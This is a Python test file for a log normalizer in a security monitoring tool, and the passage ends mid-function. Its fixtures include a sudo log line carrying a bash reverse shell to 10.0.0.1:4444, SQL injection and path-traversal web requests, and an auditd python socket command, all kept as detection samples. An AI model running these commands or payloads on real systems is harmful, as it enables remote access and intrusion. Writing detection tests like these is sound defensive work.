"""
tests/test_parse_contracts.py
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Golden log contract testleri.

Her kaynak için "golden log" satırları — regex drift, format değişikliği
veya yanlış field ataması bu testlerle anında yakalanır.

Kural: test geçiyorsa parse doğru, geçmiyorsa normalize.py bozulmuş.
"""

import sys
import time
from tests.shims import activate_test_shims

activate_test_shims()

import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.normalize import Normalizer, SyslogParser, AuditdParser, WebLogParser, UFWParser, UtmpParser, PostfixParser

# ── Fixture ───────────────────────────────────────────────────────────────────

@pytest.fixture
def normalizer():
    return Normalizer()

@pytest.fixture
def syslog():
    return SyslogParser()

@pytest.fixture
def auditd():
    return AuditdParser()

@pytest.fixture
def web():
    return WebLogParser()

@pytest.fixture
def ufw():
    return UFWParser()

@pytest.fixture
def utmp():
    return UtmpParser()

@pytest.fixture
def postfix():
    return PostfixParser()


# ── SSH ───────────────────────────────────────────────────────────────────────

class TestSSHParse:
    ACCEPTED = "Mar  5 12:34:56 myhost sshd[1234]: Accepted password for root from 192.168.1.100 port 22345 ssh2"
    FAILED   = "Mar  5 12:35:00 myhost sshd[1235]: Failed password for admin from 10.0.0.1 port 54321 ssh2"
    INVALID  = "Mar  5 12:36:00 myhost sshd[1236]: Invalid user testuser from 192.168.1.200"
    ISO_TS   = "2026-03-05T12:34:56.000000+03:00 myhost sshd[999]: Accepted publickey for alice from 10.0.0.5 port 44321 ssh2"

    def test_ssh_success_category(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action   == "ssh_login"
        assert evt.outcome  == "success"

    def test_ssh_success_fields(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt.user   == "root"
        assert evt.src_ip == "192.168.1.100"
        assert evt.fields.get("auth_method") == "password"

    def test_ssh_fail_category(self, syslog):
        evt = syslog.parse_line(self.FAILED, "auth.log")
        assert evt.outcome == "failure"
        assert evt.user    == "admin"
        assert evt.src_ip  == "10.0.0.1"

    def test_ssh_invalid_user_failed_password_marks_field(self, syslog):
        line = "Mar  5 12:35:00 myhost sshd[1235]: Failed password for invalid user oracle from 10.0.0.1 port 54321 ssh2"
        evt = syslog.parse_line(line, "auth.log")
        assert evt.outcome == "failure"
        assert evt.action == "ssh_login"
        assert evt.user == "oracle"
        assert evt.fields.get("invalid_user") is True

    def test_ssh_invalid_user(self, syslog):
        evt = syslog.parse_line(self.INVALID, "auth.log")
        assert evt.action  == "ssh_invalid_user"
        assert evt.outcome == "failure"
        assert evt.user    == "testuser"
        assert evt.src_ip  == "192.168.1.200"

    def test_iso_timestamp_parse(self, syslog):
        evt = syslog.parse_line(self.ISO_TS, "auth.log")
        assert evt is not None
        assert evt.user   == "alice"
        assert evt.src_ip == "10.0.0.5"
        assert evt.ts     > 0

    def test_raw_field_preserved(self, syslog):
        evt = syslog.parse_line(self.ACCEPTED, "auth.log")
        assert evt.raw == self.ACCEPTED


# ── Sudo ──────────────────────────────────────────────────────────────────────

class TestSudoParse:
    SUDO_OK   = "Mar  5 12:35:30 myhost sudo[999]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash"
    SUDO_FAIL = "Mar  5 12:36:00 myhost sudo[998]: mslm : authentication failure"
    SUDO_LOTL = "Mar  5 12:37:00 myhost sudo[997]: bob : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=bash -i >&/dev/tcp/10.0.0.1/4444"

    def test_sudo_success(self, syslog):
        evt = syslog.parse_line(self.SUDO_OK, "auth.log")
        assert evt.action  == "sudo"
        assert evt.outcome == "success"
        assert evt.user    == "alice"
        assert evt.fields.get("sudo_target_user") == "root"

    def test_sudo_fail(self, syslog):
        evt = syslog.parse_line(self.SUDO_FAIL, "auth.log")
        assert evt.outcome == "failure"
        assert evt.action  in ("sudo_fail", "sudo")

    def test_sudo_lotl_detection(self, syslog):
        evt = syslog.parse_line(self.SUDO_LOTL, "auth.log")
        assert evt.action  == "lotl_exec"
        assert evt.fields.get("lotl") is True
        assert "bash_reverse_shell" in evt.fields.get("attack", "")


class TestFaillockParse:
    FAILLOCK = "Mar  5 12:36:00 myhost sshd[998]: pam_faillock(sshd:auth): Consecutive login failures for user root account temporarily locked"

    def test_faillock_lock(self, syslog):
        evt = syslog.parse_line(self.FAILLOCK, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "account_locked"
        assert evt.outcome == "failure"
        assert evt.user == "root"
        assert evt.fields.get("auth_mechanism") == "faillock"


class TestVPNIdentityParse:
    OPENVPN_OK = "Mar  5 12:40:00 myhost openvpn[2001]: client1/198.51.100.25:54321 Peer Connection Initiated with [AF_INET]198.51.100.25:54321"
    OPENVPN_FAIL = "Mar  5 12:41:00 myhost openvpn[2001]: client1/198.51.100.25:54321 AUTH_FAILED"
    OPENVPN_CLOSE = "Mar  5 12:41:10 myhost openvpn[2001]: client1/198.51.100.25:54321 SIGTERM[soft,remote-exit] received, client-instance exiting"
    SSSD_FAIL = "Mar  5 12:42:00 myhost sshd[2002]: pam_sss(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice"
    SSSD_OK = "Mar  5 12:42:30 myhost sshd[2002]: pam_sss(sshd:auth): authentication success; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice"
    SSSD_SESSION_OPEN = "Mar  5 12:42:40 myhost sshd[2002]: pam_sss(sshd:session): session opened for user alice"
    SSSD_SESSION_CLOSE = "Mar  5 12:42:50 myhost sshd[2002]: pam_sss(sshd:session): session closed for user alice"
    WINBIND_FAIL = "Mar  5 12:43:00 myhost sshd[2003]: pam_winbind(sshd:auth): request failed, NT_STATUS_LOGON_FAILURE for user 'EXAMPLE\\\\alice'"
    WINBIND_OK = "Mar  5 12:43:30 myhost sshd[2003]: pam_winbind(sshd:auth): user 'EXAMPLE\\\\alice' granted access"
    WINBIND_SESSION_OPEN = "Mar  5 12:43:40 myhost sshd[2003]: pam_winbind(sshd:session): session opened for user EXAMPLE\\\\alice"
    WINBIND_SESSION_CLOSE = "Mar  5 12:43:50 myhost sshd[2003]: pam_winbind(sshd:session): session closed for user EXAMPLE\\\\alice"
    WINBIND_LOCKED = "Mar  5 12:44:05 myhost sshd[2003]: pam_winbind(sshd:auth): request failed, NT_STATUS_ACCOUNT_LOCKED_OUT for user 'EXAMPLE\\\\alice'"
    WINBIND_POLICY = "Mar  5 12:44:10 myhost sshd[2003]: pam_winbind(sshd:account): request failed, NT_STATUS_ACCOUNT_DISABLED for user 'EXAMPLE\\\\alice'"
    WINBIND_CRAP = "Mar  5 12:44:00 myhost winbindd[2004]: winbindd_pam_auth_crap: user [EXAMPLE\\\\bob] authentication failed"

    def test_openvpn_success(self, syslog):
        evt = syslog.parse_line(self.OPENVPN_OK, "openvpn")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "vpn_login"
        assert evt.outcome == "success"
        assert evt.src_ip == "198.51.100.25"
        assert evt.fields.get("auth_mechanism") == "openvpn"
        assert evt.user == "client1"
        assert evt.fields["vpn"] == {
            "common_name": "client1",
            "peer_ip": "198.51.100.25",
            "peer_port": "54321",
            "session_state": "connected",
        }

    def test_openvpn_failure(self, syslog):
        evt = syslog.parse_line(self.OPENVPN_FAIL, "openvpn")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "vpn_login"
        assert evt.outcome == "failure"
        assert evt.fields.get("auth_mechanism") == "openvpn"
        assert evt.src_ip == "198.51.100.25"
        assert evt.fields["vpn"] == {
            "service": "openvpn",
            "common_name": "client1",
            "peer_ip": "198.51.100.25",
            "peer_port": "54321",
        }

    def test_openvpn_session_close(self, syslog):
        evt = syslog.parse_line(self.OPENVPN_CLOSE, "openvpn")
        assert evt is not None
        assert evt.action == "session_close"
        assert evt.outcome == "success"
        assert evt.user == "client1"
        assert evt.fields["vpn"]["session_state"] == "closed"


class TestWireGuardStrongSwanParse(TestVPNIdentityParse):
    WG_OK = "Mar  5 12:45:00 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 completed"
    WG_FAIL = "Mar  5 12:45:10 myhost kernel: wireguard: wg0: Handshake for peer peerA from 198.51.100.50:51820 did not complete after 5 seconds"
    WG_CLOSE = "Mar  5 12:45:20 myhost kernel: wireguard: wg0: Peer peerA disconnected from 198.51.100.50:51820"
    SWAN_OK = "Mar  5 12:46:00 myhost charon[1234]: 10[IKE] <rw|1> IKE_SA rw[1] established between 192.0.2.1[gw.example]...198.51.100.60[alice]"
    SWAN_FAIL = "Mar  5 12:46:10 myhost charon[1234]: 11[IKE] <rw|1> EAP authentication failed for 'alice' from 198.51.100.60"
    SWAN_CLOSE = "Mar  5 12:46:20 myhost charon[1234]: 12[IKE] <rw|1> deleting IKE_SA rw[1] between 192.0.2.1[gw.example]...198.51.100.60[alice]"

    def test_wireguard_success_failure_close(self, syslog):
        ok_evt = syslog.parse_line(self.WG_OK, "syslog")
        fail_evt = syslog.parse_line(self.WG_FAIL, "syslog")
        close_evt = syslog.parse_line(self.WG_CLOSE, "syslog")

        assert ok_evt is not None
        assert ok_evt.action == "vpn_login"
        assert ok_evt.outcome == "success"
        assert ok_evt.src_ip == "198.51.100.50"
        assert ok_evt.fields["vpn"] == {
            "provider": "wireguard",
            "tunnel": "wg0",
            "peer_id": "peerA",
            "peer_ip": "198.51.100.50",
            "peer_port": "51820",
            "session_state": "connected",
        }
        assert fail_evt is not None
        assert fail_evt.action == "vpn_login"
        assert fail_evt.outcome == "failure"
        assert close_evt is not None
        assert close_evt.action == "session_close"
        assert close_evt.fields["vpn"]["session_state"] == "closed"

    def test_strongswan_success_failure_close(self, syslog):
        ok_evt = syslog.parse_line(self.SWAN_OK, "syslog")
        fail_evt = syslog.parse_line(self.SWAN_FAIL, "syslog")
        close_evt = syslog.parse_line(self.SWAN_CLOSE, "syslog")

        assert ok_evt is not None
        assert ok_evt.action == "vpn_login"
        assert ok_evt.outcome == "success"
        assert ok_evt.user == "alice"
        assert ok_evt.src_ip == "198.51.100.60"
        assert ok_evt.fields["vpn"] == {
            "provider": "strongswan",
            "connection": "rw",
            "peer_id": "alice",
            "peer_ip": "198.51.100.60",
            "session_state": "established",
        }
        assert fail_evt is not None
        assert fail_evt.action == "vpn_login"
        assert fail_evt.outcome == "failure"
        assert close_evt is not None
        assert close_evt.action == "session_close"
        assert close_evt.fields["vpn"]["session_state"] == "closed"

    def test_sssd_failure(self, syslog):
        evt = syslog.parse_line(self.SSSD_FAIL, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "identity_login"
        assert evt.outcome == "failure"
        assert evt.user == "alice"
        assert evt.fields.get("auth_mechanism") == "sssd"
        assert evt.fields["identity"] == {
            "mechanism": "sssd",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
        }

    def test_sssd_success(self, syslog):
        evt = syslog.parse_line(self.SSSD_OK, "auth.log")
        assert evt is not None
        assert evt.action == "identity_login"
        assert evt.outcome == "success"
        assert evt.user == "alice"
        assert evt.fields["identity"]["mechanism"] == "sssd"
        assert evt.fields["identity"]["service"] == "sshd"
        assert evt.fields["identity"]["phase"] == "auth"

    def test_sssd_session_open_close(self, syslog):
        open_evt = syslog.parse_line(self.SSSD_SESSION_OPEN, "auth.log")
        close_evt = syslog.parse_line(self.SSSD_SESSION_CLOSE, "auth.log")

        assert open_evt is not None
        assert open_evt.action == "session_open"
        assert open_evt.fields["identity"]["session_state"] == "opened"
        assert close_evt is not None
        assert close_evt.action == "session_close"
        assert close_evt.fields["identity"]["session_state"] == "closed"

    def test_winbind_failure(self, syslog):
        evt = syslog.parse_line(self.WINBIND_FAIL, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "identity_login"
        assert evt.outcome == "failure"
        assert evt.user == r"EXAMPLE\\alice"
        assert evt.fields.get("auth_mechanism") == "winbind"
        assert evt.fields["identity"] == {
            "mechanism": "winbind",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
            "domain": "EXAMPLE",
        }

    def test_winbind_success_and_sessions(self, syslog):
        success_evt = syslog.parse_line(self.WINBIND_OK, "auth.log")
        open_evt = syslog.parse_line(self.WINBIND_SESSION_OPEN, "auth.log")
        close_evt = syslog.parse_line(self.WINBIND_SESSION_CLOSE, "auth.log")

        assert success_evt is not None
        assert success_evt.action == "identity_login"
        assert success_evt.outcome == "success"
        assert success_evt.fields["identity"]["domain"] == "EXAMPLE"
        assert open_evt is not None
        assert open_evt.action == "session_open"
        assert open_evt.fields["identity"]["session_state"] == "opened"
        assert close_evt is not None
        assert close_evt.action == "session_close"
        assert close_evt.fields["identity"]["session_state"] == "closed"

    def test_winbind_lockout_and_policy(self, syslog):
        locked_evt = syslog.parse_line(self.WINBIND_LOCKED, "auth.log")
        policy_evt = syslog.parse_line(self.WINBIND_POLICY, "auth.log")

        assert locked_evt is not None
        assert locked_evt.action == "account_locked"
        assert locked_evt.fields["identity"]["policy"] == "lockout"
        assert policy_evt is not None
        assert policy_evt.action == "account_policy"
        assert policy_evt.fields["identity"]["policy"] == "account_disabled"
        assert policy_evt.fields["identity_policy_code"] == "NT_STATUS_ACCOUNT_DISABLED"

    def test_winbind_crap_failure(self, syslog):
        evt = syslog.parse_line(self.WINBIND_CRAP, "auth.log")
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "identity_login"
        assert evt.outcome == "failure"
        assert evt.user == r"EXAMPLE\\bob"
        assert evt.fields.get("auth_mechanism") == "winbind"

    def test_journald_identity_context_uses_preserved_metadata(self, normalizer):
        raw = (
            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"pam_sss: pam_sss(sshd:auth): authentication success; '
            'logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=alice",'
            '"_COMM":"sssd","_PID":"4321","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"sssd.service","SYSLOG_IDENTIFIER":"sssd"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt is not None
        assert evt.action == "identity_login"
        assert evt.outcome == "success"
        assert evt.fields["identity"] == {
            "mechanism": "sssd",
            "service": "sshd",
            "phase": "auth",
            "account": "alice",
            "unit": "sssd.service",
        }


# ── Auditd ────────────────────────────────────────────────────────────────────

class TestAuditdParse:
    EXECVE = (
        'type=EXECVE msg=audit(1234567890.123:456): argc=3 '
        'a0="/usr/bin/python3" a1="-c" a2="import socket; s=socket.socket()"'
    )
    PATH_WRITE = (
        'type=PATH msg=audit(1234567890.000:100): item=0 '
        'name="/etc/passwd" nametype=CREATE oflags=0x1'
    )
    SYSCALL = (
        'type=SYSCALL msg=audit(1234567890.001:200): arch=c000003e syscall=59 '
        'success=yes pid=1234 ppid=1000 uid=0 auid=1000 comm="bash" exe="/bin/bash"'
    )

    def test_execve_lotl(self, auditd):
        evt = auditd.parse_line(self.EXECVE)
        assert evt is not None
        assert evt.action  == "lotl_exec"
        assert evt.fields.get("lotl") is True

    def test_path_sensitive_write(self, auditd):
        evt = auditd.parse_line(self.PATH_WRITE)
        assert evt is not None
        assert evt.action == "sensitive_file_access"
        assert evt.fields.get("sensitive") is True

    def test_syscall_parse(self, auditd):
        evt = auditd.parse_line(self.SYSCALL)
        assert evt is not None
        assert evt.category == "process"
        assert int(evt.pid)  == 1234
        assert evt.fields.get("syscall_name") == "execve"

    def test_invalid_line_returns_none(self, auditd):
        evt = auditd.parse_line("bu bir auditd satiri degil")
        assert evt is None


# ── Web log ───────────────────────────────────────────────────────────────────

class TestWebLogParse:
    SQLI = '10.0.0.1 - - [05/Mar/2026:12:00:00 +0000] "GET /search?q=1+UNION+SELECT+1,2,3 HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
    SCANNER = '10.0.0.2 - - [05/Mar/2026:12:01:00 +0000] "GET /admin HTTP/1.1" 404 0 "-" "sqlmap/1.7"'
    NIKTO = '10.0.0.5 - - [05/Mar/2026:12:01:30 +0000] "GET /admin/../../../etc/passwd HTTP/1.1" 404 0 "-" "nikto/2.1.6"'
    TRAVERSAL = '10.0.0.3 - - [05/Mar/2026:12:02:00 +0000] "GET /../../etc/passwd HTTP/1.1" 403 0 "-" "curl/7.0"'
    NORMAL = '10.0.0.4 - - [05/Mar/2026:12:03:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"'
    VHOST = 'example.com:80 10.0.0.6 - - [05/Mar/2026:12:04:00 +0000] "GET / HTTP/1.1" 200 64 "-" "curl/8.0"'
    MALFORMED = '10.0.0.7 - - [05/Mar/2026:12:05:00 +0000] "GET /wp-login.php?id=%27" 400 0 "-" "curl/8.0"'
    APACHE_AH = '[Wed Mar 05 12:06:00.123456 2026] [core:error] [pid 1234:tid 140012345678912] [client 203.0.113.9:54444] AH10244: invalid URI path (/..%2f..%2fetc/passwd)'
    APACHE_PHP = '[Wed Mar 05 12:06:30.123456 2026] [php:error] [pid 1235] [client 198.51.100.7:60000] PHP Fatal error: Uncaught Error: Call to undefined function foo()'

    def test_sqli_detection(self, web):
        evt = web.parse_line(self.SQLI)
        assert evt.action == "sqli_attempt"
        assert evt.fields.get("attack") == "sql_injection"

    def test_scanner_detection(self, web):
        evt = web.parse_line(self.SCANNER)
        assert evt.action == "scanner_detected"

    def test_nikto_detection(self, web):
        evt = web.parse_line(self.NIKTO)
        assert evt.action == "path_traversal"
        assert evt.fields.get("attack") == "path_traversal"

    def test_path_traversal(self, web):
        evt = web.parse_line(self.TRAVERSAL)
        assert evt.action == "path_traversal"

    def test_normal_request(self, web):
        evt = web.parse_line(self.NORMAL)
        assert evt.action  == "http_request"
        assert evt.outcome == "success"
        assert evt.src_ip  == "10.0.0.4"

    def test_vhost_access_prefix(self, web):
        evt = web.parse_line(self.VHOST)
        assert evt.action == "http_request"
        assert evt.src_ip == "10.0.0.6"
        assert evt.fields.get("vhost") == "example.com:80"

    def test_malformed_request_is_controlled(self, web):
        evt = web.parse_line(self.MALFORMED)
        assert evt.action == "http_request"
        assert evt.outcome == "failure"
        assert evt.fields.get("request_malformed") is True
        assert evt.fields.get("path") == "/wp-login.php?id=%27"

    def test_apache_error_ah10244(self, web):
        evt = web.parse_line(self.APACHE_AH, "apache2")
        assert evt.action == "http_error"
        assert evt.outcome == "failure"
        assert evt.src_ip == "203.0.113.9"
        assert evt.pid == 1234
        assert evt.fields.get("module") == "core"
        assert evt.fields.get("severity") == "error"
        assert evt.fields.get("tid") == "140012345678912"
        assert evt.fields.get("client_port") == "54444"
        assert evt.fields.get("ah_code") == "AH10244"

    def test_apache_php_error(self, web):
        evt = web.parse_line(self.APACHE_PHP, "apache2")
        assert evt.action == "http_error"
        assert evt.src_ip == "198.51.100.7"
        assert evt.fields.get("module") == "php"
        assert evt.fields.get("severity") == "error"
        assert "PHP Fatal error" in evt.message


# ── UFW ───────────────────────────────────────────────────────────────────────

class TestUFWParse:
    BLOCK = "Mar  5 12:00:00 myhost kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.50 DST=10.0.0.1 SPT=1234 DPT=22"
    ALLOW = "Mar  5 12:01:00 myhost kernel: [UFW ALLOW] IN=eth0 OUT= SRC=10.0.0.2 DST=10.0.0.1 DPT=80"

    def test_ufw_block(self, ufw):
        evt = ufw.parse_line(self.BLOCK)
        assert evt is not None
        assert evt.action  == "firewall_block"
        assert evt.outcome == "blocked"
        assert evt.src_ip  == "192.168.1.50"
        assert evt.fields.get("dst_port") == "22"

    def test_ufw_allow(self, ufw):
        evt = ufw.parse_line(self.ALLOW)
        assert evt.action  == "firewall_allow"
        assert evt.outcome == "allowed"


class TestFirewallTelemetryParse:
    NFT_DROP = "Mar  5 12:02:00 myhost kernel: nftables: DROP TABLE=inet CHAIN=input IN=eth0 OUT= SRC=203.0.113.5 DST=10.0.0.1 PROTO=TCP SPT=45678 DPT=22"
    KERNEL_REJECT = "Mar  5 12:03:00 myhost kernel: [12345.678] REJECT IN=eth1 OUT= MAC= SRC=198.51.100.7 DST=10.0.0.2 LEN=60 TOS=0x00 PREC=0x00 TTL=51 ID=12345 PROTO=UDP SPT=5353 DPT=53"

    def test_nftables_drop(self, syslog):
        evt = syslog.parse_line(self.NFT_DROP, "syslog")
        assert evt is not None
        assert evt.category == "network"
        assert evt.action == "firewall_block"
        assert evt.outcome == "blocked"
        assert evt.src_ip == "203.0.113.5"
        assert evt.dst_ip == "10.0.0.1"
        assert evt.fields["firewall"] == {
            "provider": "nftables",
            "verdict": "drop",
            "table": "inet",
            "chain": "input",
            "in_interface": "eth0",
            "protocol": "TCP",
            "src_port": "45678",
            "dst_port": "22",
        }

    def test_kernel_firewall_reject(self, syslog):
        evt = syslog.parse_line(self.KERNEL_REJECT, "syslog")
        assert evt is not None
        assert evt.category == "network"
        assert evt.action == "firewall_reject"
        assert evt.outcome == "rejected"
        assert evt.src_ip == "198.51.100.7"
        assert evt.dst_ip == "10.0.0.2"
        assert evt.fields["firewall"] == {
            "provider": "kernel",
            "verdict": "reject",
            "in_interface": "eth1",
            "protocol": "UDP",
            "src_port": "5353",
            "dst_port": "53",
        }

    def test_maillog_alias_uses_postfix_parser(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication succeeded: sasl_username=alice",
            "maillog",
        )

        assert evt is not None
        assert evt.source == "maillog"
        assert evt.action == "smtp_login"
        assert evt.outcome == "success"

class TestSnapshotNoGo:
    FAILLOG = "root            3        03/05/26 12:35:00 +0300  203.0.113.5"
    LASTLOG = "alice           pts/0    203.0.113.10     Tue Mar  5 12:34:00 +0300 2026"

    def test_faillog_is_explicit_no_go(self, normalizer):
        evt = normalizer.normalize(self.FAILLOG, "faillog")

        assert evt is not None
        assert evt.source == "faillog"
        assert evt.category == "unknown"
        assert evt.action == "unknown"

    def test_lastlog_is_explicit_no_go(self, normalizer):
        evt = normalizer.normalize(self.LASTLOG, "lastlog")

        assert evt is not None
        assert evt.source == "lastlog"
        assert evt.category == "unknown"
        assert evt.action == "unknown"


class TestUtmpParse:
    WTMP = "alice    pts/0        192.168.1.10     Mon Mar  5 12:34   still logged in"
    BTMP = "root     ssh:notty    203.0.113.5      Mon Mar  5 12:35 - 12:35  (00:00)"

    def test_wtmp_success(self, utmp):
        evt = utmp.parse_line(self.WTMP, failed=False)
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "login"
        assert evt.outcome == "success"
        assert evt.user == "alice"
        assert evt.src_ip == "192.168.1.10"
        assert evt.process == "login"

    def test_btmp_failure(self, utmp):
        evt = utmp.parse_line(self.BTMP, failed=True)
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "login"
        assert evt.outcome == "failure"
        assert evt.user == "root"
        assert evt.src_ip == "203.0.113.5"


class TestPostfixParse:
    SASL_FAIL = "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication failed: authentication failure"
    SASL_SUCCESS = "Mar  5 12:35:15 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication succeeded: sasl_username=alice"
    REJECT = "Mar  5 12:35:20 mx1 postfix/smtpd[1234]: NOQUEUE: reject: RCPT from unknown[203.0.113.5]: 554 5.7.1 Relay access denied; from=<a@b> to=<c@d> proto=ESMTP helo=<x>"

    def test_postfix_sasl_fail(self, postfix):
        evt = postfix.parse_line(self.SASL_FAIL)
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "smtp_login"
        assert evt.outcome == "failure"
        assert evt.src_ip == "203.0.113.5"
        assert evt.fields["mail"] == {
            "service": "postfix/smtpd",
            "peer": "unknown",
            "sasl_method": "LOGIN",
        }

    def test_postfix_sasl_success(self, postfix):
        evt = postfix.parse_line(self.SASL_SUCCESS)
        assert evt is not None
        assert evt.category == "auth"
        assert evt.action == "smtp_login"
        assert evt.outcome == "success"
        assert evt.user == "alice"
        assert evt.fields["mail"] == {
            "service": "postfix/smtpd",
            "peer": "unknown",
            "sasl_method": "LOGIN",
            "sasl_username": "alice",
        }

    def test_postfix_reject(self, postfix):
        evt = postfix.parse_line(self.REJECT)
        assert evt is not None
        assert evt.category == "network"
        assert evt.action == "smtp_reject"
        assert evt.outcome == "failure"
        assert "Relay access denied" in evt.fields.get("reject_reason", "")
        assert evt.fields["mail"] == {
            "service": "postfix/smtpd",
            "peer": "unknown",
        }


# ── Normalizer (Top Level) ────────────────────────────────────────────

class TestNormalizerContract:
    def test_never_returns_none(self, normalizer):
        """normalize() must never return None."""
        result = normalizer.normalize("", "syslog")
        assert result is not None

    def test_empty_line_fallback(self, normalizer):
        evt = normalizer.normalize("   ", "auth.log")
        assert evt.category == "unknown"
        assert evt.source   == "auth.log"

    def test_unknown_source_no_crash(self, normalizer):
        evt = normalizer.normalize("some random log line", "unknown_src")
        assert evt is not None
        assert evt.source == "unknown_src"

    def test_faillock_route(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:36:00 myhost sshd[998]: pam_faillock(sshd:auth): Consecutive login failures for user root account temporarily locked",
            "auth_log"
        )
        assert evt.category == "auth"
        assert evt.action == "account_locked"
        assert evt.outcome == "failure"

    def test_wtmp_route(self, normalizer):
        evt = normalizer.normalize(
            "alice    pts/0        192.168.1.10     Mon Mar  5 12:34   still logged in",
            "wtmp"
        )
        assert evt.category == "auth"
        assert evt.action == "login"
        assert evt.outcome == "success"

    def test_btmp_route(self, normalizer):
        evt = normalizer.normalize(
            "root     ssh:notty    203.0.113.5      Mon Mar  5 12:35 - 12:35  (00:00)",
            "btmp"
        )
        assert evt.category == "auth"
        assert evt.action == "login"
        assert evt.outcome == "failure"

    def test_mail_route(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:35:10 mx1 postfix/smtpd[1234]: warning: unknown[203.0.113.5]: SASL LOGIN authentication failed: authentication failure",
            "mail"
        )
        assert evt.category == "auth"
        assert evt.action == "smtp_login"
        assert evt.outcome == "failure"

    def test_openvpn_route(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:40:00 myhost openvpn[2001]: client1/198.51.100.25:54321 Peer Connection Initiated with [AF_INET]198.51.100.25:54321",
            "openvpn"
        )
        assert evt.category == "auth"
        assert evt.action == "vpn_login"
        assert evt.outcome == "success"
        assert evt.fields["vpn"]["common_name"] == "client1"

    def test_ts_always_set(self, normalizer):
        evt = normalizer.normalize("garbage line", "syslog")
        assert evt.ts > 0

    def test_parse_fail_stats_tracked(self, normalizer):
        """parse_fail_stats() should return source-based statistics."""
        # Intentional failure
        for _ in range(5):
            normalizer.normalize("bu auditd formatı değil", "auditd")
        stats = normalizer.parse_fail_stats()
        assert "auditd" in stats
        assert stats["auditd"]["total"] >= 5

    def test_stats_success_counted(self, normalizer):
        line = "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2"
        normalizer.normalize(line, "auth.log")
        s = normalizer.stats()
        assert s["parsed"] >= 1

    def test_missing_field_no_crash(self, normalizer):
        """An empty user/src_ip warning must not raise an exception."""
        line = "Mar  5 12:34:56 host sshd[1]: Failed password for invalid user from  port 22 ssh2"
        evt = normalizer.normalize(line, "auth.log")
        assert evt is not None

    def test_auth_log_duplicate_candidate_added(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2",
            "auth.log"
        )

        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_success"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"] == {
            "family": "auth_login",
            "source_rank": 2,
            "preferred_source_class": "auth_log",
            "event_source_class": "auth_log",
        }

    def test_wtmp_duplicate_candidate_added(self, normalizer):
        evt = normalizer.normalize(
            "alice    pts/0        192.168.1.10     Mon Mar  5 12:34   still logged in",
            "wtmp"
        )

        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_success"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "accounting"
        assert evt.fields["metadata"]["duplicate_policy"]["source_rank"] == 1
        assert evt.fields["metadata"]["duplicate_policy"]["preferred_source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"]["event_source_class"] == "accounting"

    def test_btmp_duplicate_candidate_added(self, normalizer):
        evt = normalizer.normalize(
            "root     ssh:notty    203.0.113.5      Mon Mar  5 12:35 - 12:35  (00:00)",
            "btmp"
        )

        assert evt.fields["metadata"]["duplicate_candidate"]["family"] == "auth_login"
        assert evt.fields["metadata"]["duplicate_candidate"]["kind"] == "login_failed"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "accounting"
        assert evt.fields["metadata"]["duplicate_policy"]["source_rank"] == 1
        assert evt.fields["metadata"]["duplicate_policy"]["preferred_source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"]["event_source_class"] == "accounting"

    def test_duplicate_candidate_omitted_for_non_auth_login(self, normalizer):
        evt = normalizer.normalize(
            "Mar  5 12:35:20 mx1 postfix/smtpd[1234]: NOQUEUE: reject: RCPT from unknown[203.0.113.5]: 554 5.7.1 Relay access denied; from=<a@b> to=<c@d> proto=ESMTP helo=<x>",
            "mail"
        )

        assert evt.action == "smtp_reject"
        assert "metadata" not in evt.fields

    def test_journald_duplicate_candidate_preserves_metadata(self, normalizer):
        raw = (
